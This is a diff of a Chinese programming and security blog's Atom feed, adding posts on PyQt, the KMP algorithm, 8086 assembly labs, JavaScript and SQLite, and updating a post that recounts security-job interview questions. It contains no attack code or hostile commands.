@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-04-21T04:23:37.231Z</updated>
+  <updated>2020-04-25T05:37:12.964Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -15,6 +15,138 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>端口转发</title>
+    <link href="http://prontosil.com/posts/c0e91c93/"/>
+    <id>http://prontosil.com/posts/c0e91c93/</id>
+    <published>2020-04-25T05:37:12.000Z</published>
+    <updated>2020-04-25T05:37:12.964Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>pyqt入门</title>
+    <link href="http://prontosil.com/posts/341a7d9a/"/>
+    <id>http://prontosil.com/posts/341a7d9a/</id>
+    <published>2020-04-24T01:54:45.000Z</published>
+    <updated>2020-04-24T02:12:35.565Z</updated>
+    
+    <content type="html"><![CDATA[<p>编写一个简单地GUI应用如下</p><p><img src="/posts/341a7d9a/1587693985383.png" alt></p><p>拖动进度条，下面两个框框会显示不同的数据</p><p>输入姓名，点击设置姓名，下面的框框回回显数据</p><p>点击关闭按钮关闭窗口</p><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><p>妥妥拽拽即可</p><p><img src="/posts/341a7d9a/1587694105991.png" alt></p><p>两个 <code>groupbox</code> 布局可以通过</p><p><img src="/posts/341a7d9a/1587694167654.png" alt></p><p>进行设置</p><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>关闭按钮的信号直接通过拖动即可关联</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><pre><code class="python">import sysfrom PyQt5.QtCore import QObject,pyqtSlot,pyqtSignalclass human(QObject):    nameChanged = pyqtSignal(str)    ageChanged = pyqtSignal([int], [str])    def __init__(self, name=&quot;Mike&quot;, age=10,parent=None):        super().__init__(parent)    def setAge(self, age):        self._age = age        self.ageChanged.emit(self._age)        if age&lt;=18:            ageInfo=&quot;你是 少年&quot;        elif (18&lt; age &lt;=35):            ageInfo=&quot;你是 年轻人&quot;        elif (35&lt; age &lt;=55):            ageInfo=&quot;你是 中年人&quot;        elif (55&lt; age &lt;=80):            ageInfo=&quot;您是 老人&quot;        else:            ageInfo=&quot;您是 寿星啊&quot;        self.ageChanged[str].emit(ageInfo)    def setName(self, name):        self._name = name        self.nameChanged.emit(self._name)</code></pre><p>自定义两个信号 <code>nameChanged</code> 和 <code>ageChanged</code></p><p>自定义槽函数</p><pre><code class="python">class MyWidget(QWidget):    def __init__(self,parent=None):        super().__init__(parent=parent)        self._ui = Ui_Widget()        self._ui.setupUi(self)        self.body = human(&quot;Mike&quot;, 20)        self.body.nameChanged.connect(self.do_nameChanged)        self.body.ageChanged.connect(self.do_ageChanged_int)        self.body.ageChanged[str].connect(self.do_ageChanged_str)    def on_horizontalSlider_valueChanged(self,value):        self.body.setAge(value)        pass    def on_pushButton_clicked(self):        &#39;&#39;&#39;        当按钮点击时候自动触发该槽函数        从输入框中获取到输入的姓名，接着调用body的setName方法，setName方法会放出一个信号，由于之前设置的连接，直接触发do_nameChanged槽函数        &#39;&#39;&#39;            hisName = self._ui.lineEdit_5.text()        self.body.setName(hisName)        pass    # 自定义的槽函数    def do_nameChanged(self,name):        self._ui.editNameHello.setText(&quot;Hello&quot;+name)        pass    def do_ageChanged_int(self,age):        self._ui.editAgeStr.setText(str(age))        pass    @pyqtSlot(str)    def do_ageChanged_str(self,ageInfo):        self._ui.editAgeInt.setText(ageInfo)        pass</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;编写一个简单地GUI应用如下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/341a7d9a/1587693985383.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;拖动进度条，下面两个框框会显示不同的数据&lt;/p&gt;
+&lt;p&gt;输入姓名，点击设置姓名，下面的框框回回显数据&lt;/p&gt;
+&lt;p&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="python" scheme="http://prontosil.com/tags/python/"/>
+    
+      <category term="Qt" scheme="http://prontosil.com/tags/Qt/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python实现KMP算法</title>
+    <link href="http://prontosil.com/posts/9bd3a30d/"/>
+    <id>http://prontosil.com/posts/9bd3a30d/</id>
+    <published>2020-04-22T12:23:39.000Z</published>
+    <updated>2020-04-22T12:29:13.246Z</updated>
+    
+    <content type="html"><![CDATA[<p>学习完KMP算法才发现编程如此的奇妙</p><h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h2><pre><code class="python">def getNext(s):    &#39;&#39;&#39;    计算字符串的next数组    &#39;&#39;&#39;    length = len(s)    next = [0 for i in range(length)]    next[0] = -1    k = -1    j = 0    while j &lt; length-1:        # 这个 or 逻辑写的np        if k == -1 or s[j] == s[k]:            j += 1            k += 1            next[j] = k        else:            k = next[k]    return next</code></pre><p>从这张图可以看到整个的匹配过程，如果 $p_{k}$ 和 $p_{j}$ 匹配不上，那么就去看 $p_{next[k]}$ 和 $p_{j}$</p><p><img src="/posts/9bd3a30d/20150812214857858.png" alt></p><p>比如</p><pre><code>p = &quot;ABCDABD&quot;</code></pre><p>得到的结果就是</p><pre><code>[-1, 0, 0, 0, 0, 1, 2]</code></pre><p>细节感觉还是要靠自己体会</p><h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><pre><code class="python">def KMP(s,p):    next = getNext(p)    m,n = 0,0    while m &lt; len(s) and n &lt; len(p):        if n == -1 or p[n] == s[m]:            n += 1            m += 1        else:            n = next[n]    if n == len(p):        return True    else:        return False</code></pre><p>从头开始匹配即可，遇到匹配不上的情况就返回到 <code>next[k]</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/v_JULY_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_JULY_v/article/details/7041827</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;学习完KMP算法才发现编程如此的奇妙&lt;/p&gt;
+&lt;h2 id=&quot;求next数组&quot;&gt;&lt;a href=&quot;#求next数组&quot; class=&quot;headerlink&quot; title=&quot;求next数组&quot;&gt;&lt;/a&gt;求next数组&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;d
+      
+    
+    </summary>
+    
+    
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="KMP" scheme="http://prontosil.com/tags/KMP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>汇编从入门到入土七</title>
+    <link href="http://prontosil.com/posts/ce48dac5/"/>
+    <id>http://prontosil.com/posts/ce48dac5/</id>
+    <published>2020-04-21T11:10:08.000Z</published>
+    <updated>2020-04-22T03:01:03.182Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>sub al,al ZF=1,PF=1,SFmov al,1  ZF=0,PF=0,SFpush axpop bxadd al,bl add al,10mul al</code></pre><h2 id="实验十"><a href="#实验十" class="headerlink" title="实验十"></a>实验十</h2><h3 id="打印字符"><a href="#打印字符" class="headerlink" title="打印字符"></a>打印字符</h3><blockquote><p>这里的重点是不知道字符串的长度，但是知道字符串十以0结尾的，所以利用 cx = 0 jcxz 会跳转，不断地置ch=0，当取到的字符cl=0时即可跳转</p></blockquote><pre><code class="asm">assume cs:codedata segment    db &#39;Welcome to masm!&#39;, 0data endscode segmentstart:    mov dh,8 ;dh表示行号    mov dl,3 ;dl表示列号    mov cl,2 ;cl表示颜色    mov ax,data    mov ds,ax    mov si,0 ;字符串开始的位置    call show_str    mov ax,4c00h    int 21hshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="asm">assume cs:codedata segment    db 10 dup(0)data endscode segmentstart:    mov ax,12666    mov bx,data    mov ds,bx    mov si,0    call dtoc    mov dh,8    mov dl,3    mov cl,2    call show_str    mov ax,4c00h    int 21hdtoc: mov si,9           s0: mov cx,10       mov dx,00 ;dx存放余数       div cx       add dx,30H              mov [si],dl       mov cx,ax ;判断商是否为0       jcxz rt               dec si       inc cx  ;防止cx=1的时候意外退出循环       loop s0rt: retshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;sub al,al ZF=1,PF=1,SF
+mov al,1  ZF=0,PF=0,SF
+push ax
+pop bx
+add al,bl 
+add al,10
+mul al&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;实验十&quot;&gt;&lt;a href=&quot;#实验十&quot; 
+      
+    
+    </summary>
+    
+    
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>js学习笔记</title>
+    <link href="http://prontosil.com/posts/ff9e87b6/"/>
+    <id>http://prontosil.com/posts/ff9e87b6/</id>
+    <published>2020-04-21T07:46:28.000Z</published>
+    <updated>2020-04-21T08:25:36.369Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>Object.keys()，Object.getOwnPropertyNames()</p><p>可以用来遍历对象的属性</p><pre><code class="js">var obj1 = {    &quot;name&quot;:&quot;pxy&quot;,    &quot;age&quot;:12}//undefinedObject.getOwnPropertyNames(obj1)//(2) [&quot;name&quot;, &quot;age&quot;]</code></pre><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>Object.protype上定义的方法就是实例方法，能够被Object的实例调用</p><pre><code class="js">Object.getOwnPropertyNames(Object.prototype)(12) [&quot;constructor&quot;, &quot;__defineGetter__&quot;, &quot;__defineSetter__&quot;, &quot;hasOwnProperty&quot;, &quot;__lookupGetter__&quot;, &quot;__lookupSetter__&quot;, &quot;isPrototypeOf&quot;, &quot;propertyIsEnumerable&quot;, &quot;toString&quot;, &quot;valueOf&quot;, &quot;__proto__&quot;, &quot;toLocaleString&quot;]0: &quot;constructor&quot;1: &quot;__defineGetter__&quot;2: &quot;__defineSetter__&quot;3: &quot;hasOwnProperty&quot;4: &quot;__lookupGetter__&quot;5: &quot;__lookupSetter__&quot;6: &quot;isPrototypeOf&quot;7: &quot;propertyIsEnumerable&quot;8: &quot;toString&quot;9: &quot;valueOf&quot;10: &quot;__proto__&quot;11: &quot;toLocaleString&quot;length: 12__proto__: Array(0)</code></pre><p>这些方法是所有对象都公有的</p><h3 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf"></a>valueOf</h3><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p><pre><code class="js">var obj = new Object();obj.valueOf() === obj // true</code></pre><p>但是这种情况除外：</p><pre><code>var a = new Object(1)a.valueOf() === a // false</code></pre><p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法</p><pre><code class="js">var obj = new Object();1 + obj //&quot;1[object Object]&quot;</code></pre><p>可以重写 <code>valueOf</code> 方法</p><pre><code class="js">obj.valueOf = function(){    return 2;}1+obj//3</code></pre><p>这个很好理解，因为obj查找 <code>valueOf</code> 函数，会先从自己的属性开始找，找不到就通过 <code>__proto__</code> 找上层对象的<code>valueOf</code> 属性</p><h2 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h2><h3 id="switch-case-结构"><a href="#switch-case-结构" class="headerlink" title="switch case 结构"></a>switch case 结构</h3><p>不推荐如下的方式</p><pre><code class="js">function doAction(action) {  switch (action) {    case &#39;hack&#39;:      return &#39;hack&#39;;    case &#39;slash&#39;:      return &#39;slash&#39;;    case &#39;run&#39;:      return &#39;run&#39;;    default:      throw new Error(&#39;Invalid action.&#39;);  }}</code></pre><p>推荐使用对象的方式</p><pre><code class="js">function doAction(action) {  var actions = {    &#39;hack&#39;: function () {      return &#39;hack&#39;;    },    &#39;slash&#39;: function () {      return &#39;slash&#39;;    },    &#39;run&#39;: function () {      return &#39;run&#39;;    }  };  if (typeof actions[action] !== &#39;function&#39;) {    throw new Error(&#39;Invalid action.&#39;);  }  return actions[action]();}</code></pre><p>更加简洁</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;Object对象&quot;&gt;&lt;a href=&quot;#Object对象&quot; class=&quot;headerlink&quot; title=&quot;Object对象&quot;&gt;&lt;/a&gt;Object对象&lt;/h2&gt;&lt;h3 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;headerlink&quot; 
+      
+    
+    </summary>
+    
+    
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="js" scheme="http://prontosil.com/tags/js/"/>
+    
+  </entry>
   
   <entry>
     <title>go相关笔记</title>
@@ -76,13 +208,28 @@
     <link href="http://prontosil.com/posts/532a05c/"/>
     <id>http://prontosil.com/posts/532a05c/</id>
     <published>2020-04-20T13:39:19.000Z</published>
-    <updated>2020-04-21T04:23:37.233Z</updated>
+    <updated>2020-04-24T14:18:21.870Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>.quit</code> 退出</p><p><code>.tables</code> 列出所有的表</p><p><code>.schema</code> 查看构建表的sql语句</p><p><code>.database</code> 查看数据库</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>只需要 <code>sqlite</code> 加上数据库名即可</p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><pre><code>CREATE TABLE user(ID INT NOT NULL PRIMARY KEY,name TEXT ,age TEXT,password TEXT);</code></pre><p><strong>sqlite不支持修改表已经存在的字段</strong>，只能把原有的表重命名一下再创建一个</p><pre><code>alter table user rename to `user_123`;</code></pre><p>如果主键要求自动递增</p><pre><code class="sql">CREATE TABLE user(ID INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,name TEXT,password TEXT);</code></pre><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><pre><code>insert into user(name,password) values(&quot;pxy&quot;, &#39;123456&#39;);</code></pre><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><pre><code class="sql">sqlite&gt; select * from user;1|pxy|123456</code></pre>]]></content>
     
     <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h2&gt;&lt;p&gt;&lt;code&gt;.quit&lt;/code&gt; 退出&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;.tables&lt;/code&gt; 列出所有的表&lt;/p&gt;
+&lt;
+      
     
     </summary>
     
     
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="sqlit" scheme="http://prontosil.com/tags/sqlit/"/>
+    
+      <category term="数据库" scheme="http://prontosil.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
     
   </entry>
   
@@ -123,13 +270,26 @@
     <link href="http://prontosil.com/posts/79b4f583/"/>
     <id>http://prontosil.com/posts/79b4f583/</id>
     <published>2020-04-20T01:23:24.000Z</published>
-    <updated>2020-04-21T04:23:37.323Z</updated>
+    <updated>2020-04-22T02:59:53.415Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="mul和div"><a href="#mul和div" class="headerlink" title="mul和div"></a>mul和div</h2><p><strong>mul指令</strong></p><ol><li>两个相乘的数，如果都为8位，其中一个默认存放在AL，另一个放在8位寄存器或者内存字节单元中，结果是16位的，默认存放在AX中</li><li>两个相乘的数，如果都为16位，其中一个默认存放在AX，另一个放在16位寄存器或者内存字单元中，结果是32位的，高位默认存放在DX中，低位存放在AX中</li></ol><p><strong>div指令</strong></p><ol><li>除数有8位和16位，存放在reg或者内存单元</li><li>除数为8位，被除数为16位，被除数默认存放在AX中。除数为16位，被除数为32位，被除数高位存放在DX中，低位存放在AX中</li><li>结果，除数为8位，商存储在AL，余数存储在AH。除数为16位，商存储在AX，余数存储在DX</li></ol><h2 id="实验九-打印"><a href="#实验九-打印" class="headerlink" title="实验九 打印"></a>实验九 打印</h2><p>打印helloworld</p><p>尤其要注意 <code>mov al, [bp]</code>，这里是取出</p><pre><code class="asm">assume cs:codedata segment    db &#39;Hello World&#39;    db 24h    dw 1824 data endscode segmentstart:    mov ax,data    mov ds,ax    mov ax, 0b800h    mov es, ax    mov si,0    mov di,0    mov bx, ds:[12]    mov bp, ds:[11]    mov cx, 11s:    mov al, ds:[si]    mov es:[bx+di], al    mov al, [bp]    mov es:[bx+di+1], al    inc si    add di,2    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre>]]></content>
     
     <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;mul和div&quot;&gt;&lt;a href=&quot;#mul和div&quot; class=&quot;headerlink&quot; title=&quot;mul和div&quot;&gt;&lt;/a&gt;mul和div&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;mul指令&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;两个相乘的数，如果都为8位，
+      
     
     </summary>
     
     
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
     
   </entry>
   
@@ -138,7 +298,7 @@
     <link href="http://prontosil.com/posts/ddd168ac/"/>
     <id>http://prontosil.com/posts/ddd168ac/</id>
     <published>2020-04-19T23:44:35.000Z</published>
-    <updated>2020-04-21T06:31:01.281Z</updated>
+    <updated>2020-04-21T06:47:58.913Z</updated>
     
     <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛红攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
     
@@ -380,145 +540,6 @@ if(!preg_match(&amp;#39;/[a-z0-9]/is&amp;#39;,$_GET[&amp;#39;shell&amp;#39;])) {
     
     
       <category term="内网" scheme="http://prontosil.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Laravel POP链讲解</title>
-    <link href="http://prontosil.com/posts/898eeda9/"/>
-    <id>http://prontosil.com/posts/898eeda9/</id>
-    <published>2020-03-18T00:27:16.000Z</published>
-    <updated>2020-03-18T00:45:48.519Z</updated>
-    
-    <content type="html"><![CDATA[<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=90514239&cid=154578272&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="480" width="780"> </iframe></div>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-
